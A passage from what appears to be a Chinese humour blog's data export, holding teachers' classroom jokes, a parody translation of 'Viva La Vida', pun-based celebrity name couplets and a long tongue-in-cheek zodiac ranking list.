哎!”老师肯定暴尴尬.说:[咦–哦对.是D!我刚才怎么也看差了–”然后又讲一便D.同学又说:[哎呀老师实在不好意思.我突然想起来了.这题应该选A的–”这样就能轻松地摧毁你们老师的自尊心.增强自己的满足感.不过别乱用啊!试个一两次的就行了. 有一种投射装置.以前三国时代用的.你们知道吗?投石器啊.就是一块板.下面装四个轮子.人们推着它满地跑.板子上面装着一个粪勺一样的东西.前面有个人拽着.粪勺里面搁一块板砖.前面的人往下一拽.粪勺[唰–”地一下子就起来了.里面的板砖飞了出去.再看那边[啪–”地就拍死了一个. 你们需要颠覆一个常识:考试时老师说停的时候你们还能写吗?其实还能.你要正在写篇作文.结果时间到了.老师说:[停!”你还可以写.老师说:[都停笔了啊!”你还可以写.老师说:[都别写了啊!这样对别人不公平啊!”你还可以写.老师说:[哎那个男生怎么回事啊!说你呢!”哎!笔一搁.就别再写了.要不然监考老师就会认为你在挑战他的权威性. 都说进新东方的老师的嗓子.第一年是百灵.第二年是那英.第三年是田震.第四年就成伍伯了.我这是第五年.已经在朝着臧天朔发展了. 你们说是买正版盘的人多还是买盗版盘的人多?那肯定是盗版啊!正版一张30块钱.盗版一张5块钱.而有时候盗版的比正版的质量还要好.–最重要的是卖盗版盘的售后服务好啊!你说要买着一张盘.有点看不清楚.你就去卖盘那哥们那跟他说,[这有点不清楚.能不能换一张?”他肯定说: [行!给你换一张吧.”更逗的是有时候你去一个人那买盘.买多了都认识了.然后你买了一张&lt;黄金甲&gt;看.看完了觉得没意思.拿着&lt;黄金甲&gt;去那跟他说: [哎哥们.这盘没意思.能不能给我换一张看?”他绝对说:[没问题!这就给你找张好看的!”这多好!你要说拿着&lt;黄金甲&gt;去西单图书大厦跟人家说:[这片子不好看.能不能给我换一张?”人家保安肯定对你说:[滚!” 有的同学问我.说老师.我很努力在背单词.但是总是头天晚上背好.第二天又忘了.这是为什么?对啊.这是为什么?为什么你会忘? Because you are human beings.因为你是人类.给你一本牛津英汉词典.你看一遍就全能背下来.那你肯定把内裤穿外面–超人嘛.内衣外穿的典范. [张洪伟] 起名字的问题：中西方都不愿意以献花、野草起名字，什么牡丹玫瑰，小红小翠了，一听就变味了；张建、李建，但不能叫范建（贱）了；北京以前有个建（贱）人学校，你打电话咨询，服务小姐会说：您好，**。[张洪伟] I have a dream ……中国连续7年大丰收，美国连续7年大旱，颗粒无收，美国立即由超级大国沦落为第三世界发展中国家。很多美国人梦想到中国来，我们就让他们考汉语托福、 GRE，考文言文太简单了，要考就考甲骨文，而且规定只能用毛笔、龟壳答题，第一题就考活雷锋与活蜜蜂的关系，分值50分！[关键] 上课我没什么要求大家的，你们只要keep mind active, make yourself comfortable就可以了。尤其是，喝牛奶的别呛着就成。吃东西别影响别人就成，尤其别吃日本豆，嘎蹦嘎蹦响的，这是大家的道德底线。[关键] 教大家四个用法，包你打遍英语角无敌手：Oh yes．／Oh no．／Really?／I don t think so. 大家要不要跟我重复一遍？[关键] 学生记笔记，肯定是不看的，这是学生的天性。我这次带到成都的书可以放一个小房间，但是我肯定不会看， never and never.[关键] 我就向往资本主义腐朽糜烂的生活。[关键] 跟大家说，人生贵在坚持，今天我能看到你们已经很高兴了，咱们再坚持一会儿，还有…… 还有4个小时是吧？[关键] 现在的孩子，4岁就学会了摆兵马俑造型，目光做思考状—— To be or not to be, it s a question.[关键] 又要我唱歌？我不唱了，上次不唱过了吗。我一唱这几首就想哭。男生去听《有多少爱可以重来》，女生去听《后来》。[郭中宝] 大家平时背一点冷门的单词除了炫耀以外一点用都没有，但是如果在口试的时候就有用处了。比如如果考题中出现疯牛病，你说Mad Cow Disease，考官最多点点头，想这是中口的水平，如果你说 BSE，考官想不错还知道这个缩写，但你如果脱口而出Bovine Spongiform Encephalopathy，考官肯定当场傻了眼，这整个一牛人啊，而且还是一疯牛！[郭中宝] 口试的时候很多同学会很紧张，于是发挥失常，比如有一次一个学生在做口译的时候听到Microsoft，他一下子没反应过来，就把它翻成了麦克尔索夫特，一篇文章口译下来，全都是麦克尔索夫特，考官在一边听得爆笑，偏偏又不能笑出来，忍得脸都抽筋了。[郭中宝] 我当时总结出一条学习英语的方法，回去之后我把我的方法传授给我弟弟，之后的一年里，我想偷懒，就没用这条方法，但我弟弟坚持下来了，再然后他就拿到了牛津大学的OFFER，而我只能在这里做新东方的老师。[郝斌] 同学们不要趴在桌子上，这方面我很有经验的，大学时我几乎每节课都趴桌子，所以我的每一本书都很脏。[郝斌] ECONOMIST是一本很不错的杂志，大家以后如果去英国的话，手上拿一本ECONOMIST ，就具备了一个英国上流社会人士的……外部特征。[郝斌]大家为什么用这么漠然的眼神看着我？没有听懂吗？唉，为什么大家每次都用这种方式来羞辱我的英语发音。[郝斌] 后面的简答题，就算写不出来也不要空着，说什么也要凑两个字出来，比如他如果问你”Who is he? “，你就回答 “He is a person who is……” 就算考官再怎么丧心病狂也会给你一分的……哎，大家为什么用这种好像觉得我很无耻的眼光看着我？[郝斌] 我有个同学去英国留学回来后整个人都变了，以前曾经是很率真很粗鲁的一个人，回来之后居然变得彬彬有礼。那次我们同学聚会，我和他两个人先到了，那天很热，我就说我们先进去吧，里面有空调，他死活不肯，说我们班上的女同学还没到呢，我要等她们来了再一起进去，我说你什么时候变得这么恶心？就自己先进去了。后来吃完饭我们要过马路，当时是红灯，但四周没有车，根据正常的生理反应，我拔腿就想冲过去，按常理来说，他应该冲得比我还快的，但是那天他突然一把抱住我，我说这里这么多人在你干吗抱着我，他说你怎么可以乱穿马路你怎么可以这么无耻？那个瞬间，我的眼眶湿润了，我想这就是文化的熏陶啊。又过了一个星期，我陪他去买电脑，然后我惊奇地发现他已经变回他出国前的德行了，于是我又在那里感慨，这就是文化的熏陶啊文化的熏陶。[郝斌] 以色列人其实对我们中国很好，我们对他们一般。每次我们想要什么先进的技术，都会首先想到去跟以色列买，然后以色列人就特生气，” 别谈钱！我们是兄弟，谈钱伤感情！”以色列人对我们这么好的原因是因为在二战时期上海收留了一大批犹太难民，当时纳粹的势力很大，全世界人都不敢收留犹太人，但是上海收留了。这其实是因为当时的上海老百姓比较傻，根本分不清谁是谁，在我们看来，外国人都长一个样 …当时的日军也把犹太人围在一个集中营里，没有杀他们，但不给他们吃东西。上海的那些老太太心肠软，看那些犹太人可怜就把鸡腿隔着围墙扔进去，于是十几个犹太人抢一个鸡腿。我有个同学现在以色列留","link":"/2010/078_2010-07-1013_41/"},{"title":"《Viva La Vida》的爆囧翻译","text":"Viva la Vida 沃勒割去的生活 I used to rule the world Seas would rise when I gave the word Now in the morning I sleep alone Sweep the streets I used to own 遥想当年，哥主宰世界 翻江倒海，放个p的事情 现在，哥独自无眠到天亮 寂寞无助扫大街。。 I used to roll the dice Feel the fear in my enemy’s eyes Listen as the crowd would sing: “Now the old king is dead! Long live the king!” 遥想当年，哥盾墙破釜 扛着boss不带颤 沐浴山呼： 苍天已死，黄天当道 One minute I held the key Next the walls were closed on me And I discovered that my castles stand Upon pillars of salt and pillars of sand 曾几何时，哥刚搞清钥匙是哪只 怎料转身插错门 苦心经营几十年 一朝回到解放前 I hear Jerusalem bells a ringing Roman Cavalry choirs are singing Be my mirror my sword and shield My missionaries in a foreign field For some reason I can’t explain Once you go there was never, never an honest word That was when I ruled the world 哥 听到了耶路撒冷和尚在念经 罗马骑兵文工团在呻吟 你们是哥的照妖镜，你们是哥的折戟龙鳞 哥远去的勇士们啊 是因为不能说的秘密 自从你们离去 再也没有人对哥真心 这就是当年，哥当扛霸子的事情 It was the wicked and wild wind Blew down the doors to let me in. Shattered windows and the sound of drums People couldn’t believe what I’d become YD的妖风啊 吹开门帘放我进 砸碎玻璃翻窗户，敲锣打鼓把哥迎 哥跟你说你都不信 Revolutionaries wait For my head on a silver plate Just a puppet on a lonely string Oh who would ever want to be king? 城管等着银盘红烧狮子头 哥可怜兮兮只当腰带做头绳 啊西巴，谁想做老大一当好多年？ I hear Jerusalem bells a ringing Roman Cavalry choirs are singing Be my mirror my sword and shield My missionaries in a foreign field For some reason I can’t explain I know Saint Peter won’t call my name Never an honest word But that was when I ruled the world 哥听到了耶路撒冷和尚在念经 罗马骑兵文工团在呻吟 你们是哥的照妖镜，你们是哥的折戟龙鳞 哥远去的勇士们啊 是因为不能说的秘密 我知道Peter三不会再call我 自从你们离去 再也没有真心 这就是当年，哥当扛霸子的事情","link":"/2010/080_2010-07-0910_51/"},{"title":"最全最搞笑的经典对联","text":"陈水扁在陈水家被陈水扁 杰克逊去杰克家被杰克训 赵本山去赵本家被赵本扇 张三丰到张三屋陪张三疯 奥巴马在奥巴家被奥巴骂 孙燕姿在孙燕家被孙燕滋 范冰冰去范冰家被范冰冰 王力宏去王力家被往里哄 方大同去方大家被方大捅 林心如在林心家被林心辱 王小丫在王小家被王小压 黄义达在黄奕家被黄奕打 周星驰在周星家被周星吃 谢霆锋到谢霆峰和谢霆疯 猪八戒在猪八家被猪巴结 张震岳在张震家别张震虐 郭敬明在郭靖家被郭靖抿 克林顿在克林家被克林炖 李连杰在李连街被李连劫 林宥嘉在林宥家被林宥夹 费玉清在费玉家被费玉亲 蔡依琳在蔡依家被蔡依淋 孙红雷在孙红家被孙红雷 陈奕迅到陈奕家被陈奕训 孔令辉在孔令家被孔令挥 黑眼豆豆在黑眼家被黑眼逗 达芬奇在达芬家被达芬骑 黄秋生在黄秋家被黄秋生 黄家驹在黄家被黄家拘 周立波在周立家被周立啵 方文山在方文家被方文扇 吴宗宪在吴宗家被吴宗嫌 张娜拉在张娜家被张娜拉 袁惟仁在袁惟家被袁惟认 樱桃帮在樱桃家被樱桃绑 公安局在公安居被公按菊 华盛顿在华生家被华生炖 徐静蕾在徐静家被徐静雷 张含韵在张含家被张含孕 蔡依林在蔡依家被彩衣凌 马克思去马克思家被马克思撕 罗玉凤在罗玉家逼罗玉疯 詹姆斯去詹姆家被詹姆撕@ 罗志祥去罗志家被罗志降 潘玮柏去潘伟家被潘伟搏 犀利哥在犀利家被犀利割 皮尔斯在皮尔家被皮尔撕 张凯伦在张凯家被张凯轮 杜蕾斯在杜蕾家被杜蕾撕 张学友在张学家被张学诱 韦小宝在韦小家被韦小抱 杨乃文在杨乃家被杨乃吻 郑智化在郑智家被郑智化 宁财神在宁财家被宁财审 房祖名在房祖家被房祖悯 阿迪达斯在阿迪家被阿迪打死 ***到小泉家被小泉采 徐志摩在徐志家被徐志摸 张伯伦去张伯家被张伯轮 杰士邦到杰士家被杰士绑 ***在陈冠家被陈冠嬉 钟欣铜在钟欣家被钟欣捅 刘德华在刘德家被刘德画 曾亦可在曾亦家被曾亦磕 郭德刚在德刚家和郭德杠 赵本山在赵本水被赵本睡 唐三藏到唐三家被唐三葬 李宇春在李宇家被李宇春 税务所在税务所被税务锁 梅西在梅家被梅吸 蒙娜丽莎在蒙娜丽家被蒙娜丽杀 玛丽莲梦露在玛丽莲梦家被玛丽莲梦撸 孫悟空到孫悟家被孫悟控 大嘴巴在大嘴家被大嘴扒 何洁在何家被和谐 蜘蛛精在蜘蛛家陪蜘蛛精 各种精在各种家陪各种精 卡梅伦在卡梅家被卡梅伦 陈羽凡在陈雨家被陈雨烦 希拉里在希腊家被希腊隶 林忆莲在林忆家被林忆练 山本五十六在山本五十家被山本五十溜 奥特曼在奥特星球被奥特卖了 孟德斯鸠在孟德斯家被孟德斯揪 萧敬腾在萧敬家被萧敬疼 陈丹青在陈丹家被陈丹亲 洪映早在洪映家被洪映找 王祖贤去王祖家被王祖嫌 李明博在李明家被李明啵 闫征楚在闫征家被闫征杵 日本人在日本国日本人 武腾兰在武腾家被武腾揽 黄立行在黄立家被黄立刑 芙蓉姐姐在芙蓉家被芙蓉 郭达在郭家被郭打 杨丞琳在杨晨家被杨晨凌 葫芦娃在葫芦家被葫芦挖 罗志祥在罗志家被罗志降 李亚鹏在李亚家被李亚碰 德罗巴在德罗家被德罗扒 本泽马在本泽家被本泽骂 阿里巴巴在阿里给阿里扒扒 卡洛斯在卡洛家被卡洛撕 马大帅在马大家被马大摔 小布什在小布家被小布食 唐老鸭在唐老家被唐老压 司马炎在司马家被司马阉 宋子文在宋子家被宋子闻 亚力山大在亚力山家给亚力山 冯巩去冯巩家被冯拱 罗大佑在罗达家被裸打油 罗纳尔多在罗纳尔家被罗纳尔剁 吴孟达在吴孟家被吴孟打 希尔顿在希尔家里被希尔炖 罗玉凤在罗玉家被罗玉缝 朱棣在朱家给猪踢 徐德榜在徐德家被徐德绑 郑成功在郑成家被郑成攻 袁世凯在袁氏家被袁氏砍 吴佩慈在吴佩家被吴佩刺 蔡依林在蔡家给拆衣领 黄家驹在黄家被黄家车 陈嘉桦去陈嘉家被陈嘉画 杜拉拉在杜拉家被杜拉拉 陆克文在路克家被路克闻 郑智熏在郑智家骂郑智逊 黄品冠在黄品加被黄品掼 蔡康永在蔡康家被蔡康拥 郑绰绰在郑绰家被郑绰搓 谢天笑在谢天家被谢天笑 李小双在李小家被李小爽 阿宝在阿家被阿爆 斯密达在斯密家被斯密打 王乐泉在王乐家被王乐圈 碧昂斯去碧昂家被碧昂撕 朱德庸在朱德家被朱德擁 李小璐在李小家被李小录 蔡健雅在蔡健家被蔡健压 陈绮贞在陈绮家被陈绮蒸 卡卡西到卡卡家被卡卡洗 劉著在劉家被留住 奥斯特洛夫斯基在奥斯特洛夫家当司机 玛莎拉蒂在玛莎家被玛莎拉弟 闫凤娇在闫凤家和闫凤交 金大中在金大家被金大种 李hong志在李洪家被李洪治 宋祖英去宋祖德家被宋祖赢 田馥甄在田馥家被田馥整 萨顶顶在萨顶家被萨顶顶 杰世邦在杰世家被杰世帮 范佩西在范培家被范培洗 汪精卫在王晶家被王晶喂 张震岳在张震家被张震阅 王宝强在王宝家被王宝抢 王啸坤在王啸家被王啸捆 阿尔沙文在阿尔沙家被阿尔沙吻 郑治化在郑智家被政治化 郭晶晶在郭靖家被郭靖惊 吴青峰在吴青家陪吴青疯 闻一多在闻一家被闻一剁 阿凡达在阿凡家被阿凡打","link":"/2010/081_2010-07-0821_36/"},{"title":"世上最全的星座排名","text":"最美丽： 1.天秤 2.水瓶 3.双子 ­ 最活泼： 1.白羊 2.水瓶 3.射手 ­ 最佳丈夫 ：金牛座 ­ 最爱洁： 1.处女2.天秤 3.魔羯 ­ 最佳父亲 ：狮子座 ­ 最贪吃： 1.金牛 2.天秤 3.巨蟹 ­ 最佳法官 ：天秤座 ­ 最贪玩： 1.水瓶 2.白羊 3.射手 ­ 最佳生意人：白羊座 ­ 最懒惰： 1.天秤 2.金牛 3.巨蟹 ­ 最佳推销员：双子座 ­ 最自大： 1.狮子 2.白羊 3.天蝎 ­ 最佳清洁员：处女座 ­ 最佳厨师 ：金牛座、天秤座 ­ 最佳科学家：水瓶座 ­ 最佳运动员：射手座 ­ 最容易嫉妒： 1.金牛座 2.天蝎座 3.处女座 4.射手座 5.白羊座 ­ 愿望最容易实现：1.水瓶座 2.白羊座 3.双鱼座 4.狮子座 5.双子座 ­ ­ 史上最全的星座排名(2) ­ 最佳组合： ­ 1. 天秤 + 狮子 2. 金牛 + 巨蟹 3. 双子 + 水瓶 ­ 水瓶座 — 最怕没有心灵自由 ­ 双鱼座 — 最怕现实压力 ­ 白羊座 — 最怕输给别人、怕失败、怕无聊 ­ 金牛座 — 最怕改变、怕饿 ­ 双子座 — 最怕落伍、怕别人有自已没有 ­ 巨蟹座 — 最怕没安全感 ­ 狮子座 — 最怕没面子 ­ 处女座 — 最怕犯错、怕被批评 ­ 天秤座 — 最怕孤单、怕没朋友 ­ 天蝎座 — 最怕别人背叛他、怕没权威 ­ ­射手座 — 最怕失去行动自由、怕被叮咛 魔羯座 — 最怕没钱、怕出糗、怕面子没地方挂 ­ ­ 最受男生欢迎的女生 ­ 1.天秤座：你的美貌和成熟的举动很能吸引异性 ­ 2.双鱼座：你会散发无依感，旁人会不由自主地想保护你 ­ 3.射手座：他们认为和你很好相处，因此你很受男孩子欢迎 ­ 4.水瓶座：你很会打扮，反应又快，因而受到他们的爱戴 ­ 5.双子座：风趣的言谈和爽朗的形象是你受欢迎的原因 ­ 6.处女座：你清纯的气质很能打动男孩的心 ­ 7.金牛座：你稳重温和的个性很受欢迎，就是缺少点女人味 ­ 8.巨蟹座：爱撒娇使你大受欢迎，但是你却不懂察言观色 ­ 9.牡羊座：你缺少女人味，活力太过充沛使男孩对你退避三舍 ­ 10.狮子座：高傲的你令男孩子望而却步，怕将来被你骑在头上 ­ 11.天蝎座：你浑身散发的神秘气息，让男孩子觉得你难以接近 ­ 12.魔羯座：你冷酷又我行我素，让他们觉得向你示好就会被你轻视 ­ ­ 白羊座：冲动第一名，做事后悔第一名，火气大第一名，大胆第一名，敢爱敢恨第一名。 ­ 金牛座：稳重第一名，节检第一名，贪财第一名，可靠第一名，吃苦耐劳第一名。 ­ 双子座：八卦第一名，聪慧第一名，crazy第一名，幽默第一名，多话第一名。 ­ 巨蟹座：体贴第一名，爱吃第一名，爱家第一名，孝顺第一名，多愁善感第一名。 ­ 狮子座：自信第一名，爱现第一名，要面子第一名，品味第一名，风度第一名。 ­ 处女座：细心第一名，挑剃第一名，爱干净第一名，小题大做第一名，吃醋第一名。 ­ 天秤座：爱美第一名，犹豫第一名，懒惰第一名，善辩第一名，公正第一名。 ­ 天蝎座：痴情第一名，扮酷第一名，魅力第一名，冷冰冰第一名，理智第一名。 ­ 射手座：贪玩第一名，糊涂第一名，可爱第一名，勇于尝试第一名，心无城府第一名。 ­ 摩羯座：严肃第一名，镇定第一名，忍耐第一名，认真第一名，保守第一。 ­ 水瓶座：好奇第一名，好学第一名，创意第一名，另类第一名，创造奇迹第一名。 ­ 双鱼座：心软第一名，敏感第一名，多疑第一名，爱作梦第一名，胡思乱第一名。 ­ ­ 最多女强人：双子 ­ 最少女强人：巨蟹 ­ 最会逗人开心：天秤 ­ 最会投机取巧：双子 ­ 最不会投机取巧：山羊 ­ 最没有肚量：山羊 ­ 最有肚量：射手 ­ 最不会讨人欢心：狮子 ­ 最会讨人欢心：双鱼 ­ 最输不起：天秤&amp;狮子 ­ 最感性：巨蟹 ­ 最知性：处女&amp;水瓶 ­ 最理性：水瓶 ­ 最痴情：巨蟹 ­ 最爱往外跑：射手 ­ 最爱在家里：巨蟹 ­ 最没原则：双子 ­ 最难理解：水瓶 ­ 最不会计较：巨蟹 ­ 最没有秘密：狮子 ­ 最易被理解：狮子&amp;牡羊 ­ 最神秘.最不相信人：天蝎座 ­ 最拘谨：处女 ­ 最客观：天秤 ­ 最主观：狮子 ­ 最喜欢刺激：射手&amp;牡羊&amp;双子 ­ 最爱好和平：金牛&amp;巨蟹&amp;射手 ­ 最易羞涩：金牛&amp;巨蟹&amp;天蝎 ­ 最喜欢独处：水瓶 ­ 最苛刻：双鱼 ­ 生气时最可怕：天蝎（） ­ 最会看人脸色：双子 ­ 最敢与众不同：水瓶 ­ 最迟钝：金牛 ­ 反应最快：双子 ­ 最优柔寡断：天秤 ­ 最不重视纪律：射手&amp;水瓶 ­ 最不体贴：双子 ­ 翻脸最彻底：天蝎 ­ 最会攀关系：双子 ­ 最不势头眼：双鱼 ­ 最不会内疚：天秤 ­ 最冲动：牡羊&amp;牡羊&amp;狮子 ­ 最大男人主义：天蝎&amp;牡羊 ­ 最值得信赖：山羊 ­ 记忆力最好：双鱼 ­ 最不会记恨：天秤&amp;射手 ­ 最公正：天秤 ­ 最念旧：双鱼 ­ 最矛盾：双子 ­ 最多重性格：双子 ­ 时常最正经：金牛 ­ 最不喜欢交朋友：天蝎 ­ 最有耐心：金牛 ­ 最没耐心：射手&amp;狮子 ­ 最喜欢交朋友：射手&amp;天秤 ­ 最容易交到坏朋友：射手 ­ 最会讲电话：天秤 ­ 最温柔：金牛 ­ 最体贴：巨蟹 ­ 最不会看脸色：射手 ­ 最讲义气：天蝎&amp;狮子 ­ 最懒：水瓶 ­ 最雄辩：天秤&amp;水瓶 ­ 最受不了被批评：山羊 ­ 最易感觉满足：巨蟹 ­ 最固执：金牛 ­ 最守秩序：金牛 ­ 最可能当黑马：水瓶 ­ 最会临时抱佛脚：双子&amp;射手 ­ 最怕浪费：金牛 ­ 最怕肉麻：山羊 ­ 最有上进心：山羊 ­ 最大胆：牡羊 ­ 最重视外表：天秤 ­ 最多壮身材：牡羊&amp;金牛 ­ 最多女性娇小：金牛 ­ 最会突发奇想：双子&amp;射手&amp;水瓶 ­ 最重视精神层面：水瓶 ­ 最不重视精神层面：射手 ­ 最有保护欲：狮子 ­ 最可能有收集癖：水瓶&amp;双子 ­ 最自信：狮子 ­ 最不怕上镜头：牡羊 ­ 最有人情味：巨蟹 ­ 最不浪漫：山羊 ­ 最有崇洋倾向：天秤 ­ 最我行我素：水瓶 ­ 最怕吵：天蝎 ­ 最需要自我空间：水瓶 ­ 最会拖时间：水瓶 ­ 最不正经：双子 ­ 最爱烦恼：巨蟹&amp;山羊 ­ 最不会烦恼：牡羊&amp;射手 ­ 最多帅哥：射手 ­ 最多美女：水瓶 ­ 最顾家：巨蟹 ­ 品味最古怪：水瓶 ­ 灾难中最冷静：水瓶 ­ 灾难中最不冷静：狮子&amp;牡羊 ­ 最易犯罪：射手&amp;牡羊 ­ 最女性化：水瓶&amp;金牛 ­ 最阳刚味：牡羊 ­ 最致力学课本外的东西：水瓶 ­ 最重自尊：狮子 ­ 最贪睡：水瓶 ­ 最会胡思乱想：双鱼 ­ 最爱幻想：水瓶&amp;双鱼 ­ 最会聊天：水瓶 ­ 最爱用功：山羊 ­ 最不爱用功：射手 ­ 最可能国际联姻：双子 ­ 最多嫁入豪门：双子&amp;双鱼 ­ 运气最好：双子 ­ 最会花钱：天秤 ­ 最自恋：狮子&amp;天秤 ­ 最喜欢大自然：水瓶 ­ 最会肢体语言：双子 ­ 最喜欢黑色：天蝎 ­ 最多夜猫族：双鱼 ­ 最常作鬼脸：双鱼 ­ 最光明磊落：狮子 ­ 最无性别概念：水瓶 ­ 最会挖掘秘密：天蝎 ­ 最有个人魅力：天蝎 ­ 最让人觉得是怪人：水瓶 ­ 最爱钱：金牛 ­ 最看不起钱：水瓶 ­ 用情最专一：巨蟹 ­ 最不懂人情世故：射手 ­ 最礼尚往来：金牛 ­ 话最少：天蝎 ­ ­ 星座分级娱乐 ­ *************************************************** ­ ­ 一等星座： ­ 天蝎座（深谋远虑，深藏不露，诡计多端，有魄力，有野心，意志极强，洞察力极强，实数12星星之冠！） ­ 摩羯座（吃苦耐劳，大器晚成，有野心，忍辱负重，坚韧不拔，意志顽强，仅次于天蝎座的优等星座！） ­ 水瓶座（思维怪异，非常人能及，异常冷静，行为古怪独特，捉摸不定。一个极其有魅力的外星人星座） ­ ­ 二等星座： ­ 狮子座（有领导才能，有魄力，敢作敢当，缺点是骄傲自大，不听好言相劝） ­ 天秤座（优雅，有风度，仪表堂堂，朋友众多。不过此星无主见，好享受） ­ 金牛座（稳重、踏实，有艺术细胞，为人较诚实。不过此星多为守财奴，一生为金钱劳碌） ­ 双子座（快人快语，思维敏捷，反映奇快，交际能力强。不过此星说多错多，三心两意，无定性） ­ 射手座（直性子，交际能力堪称12星星之最，朋友众多，喜欢自由自在不受拘束的生活，不过此星星没啥耐心，做事半途而废。又花心，不踏实，不忠实） ­ ­ 三等星座： ­ 白羊座（此星星多为冲动之人，没脑子，天真，好斗。） ­ 巨蟹座（此星星只知道妈妈，小孩，爱情。哭鼻子。男螃蟹也是如此，没出息） ­ 处女座（龟毛之王，神经质，斤斤计较，洁癖，不合群。比较令人讨厌的星座） ­ 双鱼座（一生活在梦幻之中，12星座中最脆弱的星座，没主见，任人摆布。嗜酒、烟、毒。同时此星星犯罪率也是12星座之首） ­ ­ 【失恋後记】 ­ 双鱼座会大醉一场；金牛座会抱头痛哭 ­ 巨蟹座会打电话诉苦；狮子座会去海边吹风 ­ 射手座会看遍所有电影；处女座会闭关三天三夜 ­ 摩羯座会认真检讨反省；牡羊座会到ＫＴＶ嘶吼 ­ 天秤座会吃尽所有美食；天蝎座会再找下一个情人 ­ 双子座会订机票出国散心；水瓶座会疯狂Ｓｈｏｐｐｉｎｇ ­ ­ 【情绪ＥＱ】 ­ 处女天生对忧虑情有独锺 ­ 金牛很能控制自己的情绪 ­ 水瓶非常冷漠，不讲私人感情 ­ 巨蟹多变的心情就像海水的潮汐 ­ 天秤偶尔发怒，极不愿听命於人 ­ 双鱼无法忍受长期被孤立的痛苦 ­ 射手不会沈溺在任何负面的情绪中 ­ 狮子会将不佳的情绪全部隐藏起来 ­ 摩羯会对自己的情绪和求加以批判 ­ 双子最不愿被束缚，无法忍受单调呆板 ­ 天蝎爱恨分明，不与他人分享自己的心情和感觉 ­ 牡羊会为不合理的事而抗争，经常以温驯的外表来掩饰内心的愤怒 ­ ­ 【爱情考验】 ­ 狮子的爱就像大碗的牛肉面货真¤实 ­ 金牛的爱就像是温暖的毛衣好看又有用 ­ 巨蟹的爱就像好吃的蛋糕吃了还想再吃 ­ 水瓶的爱就像国父革命一样一次接著一次 ­ 天秤的爱像巧克力很多人喜欢吃但吃不了很多 ­ 摩羯的爱就像拿在手中的面包拿到就是你的了 ­ 双鱼的爱是牺牲奉献的所以记得要好好珍惜喔 ­ 处女的爱就像洗衣机包容你的缺点洗净你的污点 ­ 牡羊的爱就像冬天里的一把火小心不要让火给熄了 ­ 双子的爱就像一阵风吹起来很舒服但是永远摸不著 ­ 天蝎的爱就像麻辣火锅吃得过瘾但是吃完一定拉肚子 ­ 射手的爱就像骑马打仗般刺激不是马上摔死就是被乱箭射死 ­ ­ 【失恋时期】 ­ 水瓶座说感觉不对劲早散早好 ­ 巨蟹座说心中一阵刺痛！我待他可不薄啊 ­ 射手座说这样就吹了？想得美我要讨个公道 ­ 天蝎座说你敢？再给你一次机会否则就等著瞧 ­ 金牛座说真是没良心好在我绝不吃亏先把帐算一算 ­ 双子座说真的假的？如果不是在开玩笑只好看著办了 ­ 牡羊座说有啥了不起天涯何处无芳草真是有眼不识货 ­ 天秤座说好聚好散看似随缘其实念念不忘萦绕心头不去 ­ 狮子座说此处无望只好到别处，自尊的笑容掩盖了伤心 ­ 摩羯座说暗自怀念不知道要说些什堋但将来要让他後悔 ­ 双鱼座说这是什堋结局？我有错吗？静待另外的一片天 ­ 处女座说晴天霹雳、乌云遮日、可恶应该遭受天打雷劈 ­ ­ 【生气时】 ­ 金牛座是大吃一顿懒得理 ­ 天蝎座是天塌下来他也懒的理 ­ 射手座是这口气不出不快准备麻布袋 ­ 狮子座是管他三七二十一直接找他算帐 ­ 巨蟹座是嘴巴说说就好最好做个梦扁扁他 ­ 双鱼座是躲起来写一篇浪漫悲情的苦情诗 ­ 水瓶座是咽不下这口气好歹也要冷嘲热讽一番 ­ 天秤座是惹我的话就亲近他阿谀他敲他一顿大餐 ­ 摩羯座是怕惹事会偷偷骂就好有事发生快点装笑脸 ­ 双子座是联合次要敌人除掉主要敌人有绝对复仇论 ­ 处女座是记性很好君子报仇十年不晚等到他没戒心时 ­ 牡羊座是想拿钱砸人不过还是捡起来拿去花掉比较能发泄 ­ ­ 【定情大观】 ­ 天蝎座：宁静的表情下，却有万马在内心奔腾 ­ 双鱼座：早就有预感了，默默接受，留下无限的回味 ­ 射手座：女对某个男的把手搭在肩上，男对某个女的靠得很近，没有排斥的话 ­ 摩羯座：迟迟没行动，真让旁人捏了一把冷汗，终於说了 ­ 双子座：我是真心的，接下去的动作就像挖到宝一样快乐 ­ 狮子座：找不到本垒和一垒间还有什堋，彼此欣赏後应如此 ­ 牡羊座：轻吻脸庞，丝丝暖意涌上，猴急地想进行下个步骤 ­ 水瓶座：像在开玩笑又有点正式，会心一笑知道我的意思吧 ­ 金牛座：很自然，但一垒和二垒的界线如此分明，再看看吧 ­ 天秤座：关怀的企图，两人相会的时间增多，动作就跟著来 ­ 处女座：无意间小手搭上了线，脸红润，就暂时保持现状吧 ­ 巨蟹座：愈走愈近，就这样短暂的双眸凝视後，说明了一切 ­ ­ 【单恋时候】 ­ 天蝎座说心头在绞痛，我不甘心！我还要再试一试 ­ 水瓶座说我的爱是一片真心！没有结果，错不在我… ­ 摩羯座说有点想，又有点不想，可以单恋，也可以不恋 ­ 双子座说每个都不错，不是我没品味，是我不想陷入单恋 ­ 天秤座说我已表明、已付出，我知道问题在哪、该怎堋做 ­ 处女座说思念，欣赏，喜欢，我已经很努力了，还能怎样 ­ 射手座说我的爱！不接受？没关系，这并不代表我的失败 ­ 金牛座说我真的比不上别人吗？冷静想想後，算了，不想了 ­ 双鱼座说辗转难眠，连梦中都在想，我们俩到底有没有缘份 ­ 巨蟹座说剪不掉，理还乱，若真的没希望就把思慕永埋心底 ­ 狮子座说我有哪一点配不上？什堋！我想应该还有点机会 ­ 牡羊座说不懂得欣赏我，再试试，若再没反应…哼！不识货 ­ ­ 【隐藏个性】 ­ 清纯的处女座其实是很好色 ­ 现实的摩羯座其实是很浪漫的 ­ 慷慨的天秤座基本上是小气的 ­ 温驯的双鱼座也有冷绘的一面 ­ 很个性化的水瓶座并不爱出风头 ­ 谨慎细心的天蝎座也会被礼物感动 ­ 看似磊落的狮子座其实暗中注意每个人 ­ 看似冷漠的双子座会躲在无人之处流泪 ­ 爱冒险的射手座不喜欢生活秩序遭破坏 ­ 看似粗枝大叶的牡羊座其实喜欢做家事 ­ 胆小的巨蟹座其实有舍弃一切的冒险精神 ­ 诚实的金牛座也会骗人而且不觉得有罪恶感 ­ ­ 【伤透脑筋】 ­ 找不到开创方向的牡羊座 ­ 不能没有工作的处女座赋闲在家 ­ 居然叫水瓶座不要作怪、不要胡思乱想…粉难地 ­ 生性好奇的双子座，整日面对著无聊的东西 ­ 想学点才艺的狮子座，却不知道该学什堋玩意 ­ 对钱财满在乎的金牛座，眼看著朋友借钱不还 ­ 